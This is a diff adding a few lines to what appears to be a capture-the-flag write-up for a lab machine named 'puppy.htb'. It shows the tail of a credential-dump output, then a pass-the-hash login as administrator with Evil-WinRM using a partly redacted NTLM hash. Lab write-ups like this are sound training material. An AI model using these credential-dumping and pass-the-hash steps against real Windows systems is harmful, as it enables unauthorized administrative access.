@@ -558,3 +558,8 @@ DC$:des-cbc-md5:7f044607a8dc9710
 [*] Cleaning up... 
 [*] Stopping service RemoteRegistry
 ```
+We got the hashes of most of the users including the Administrator 
+We can use the PTH attack using EVILwinRM to get the root flag
+```bash
+Evil-winrm -i puppy.htb -u 'administrator' -H 'bb0edc1{REDACTED}6e65d75b'
+```
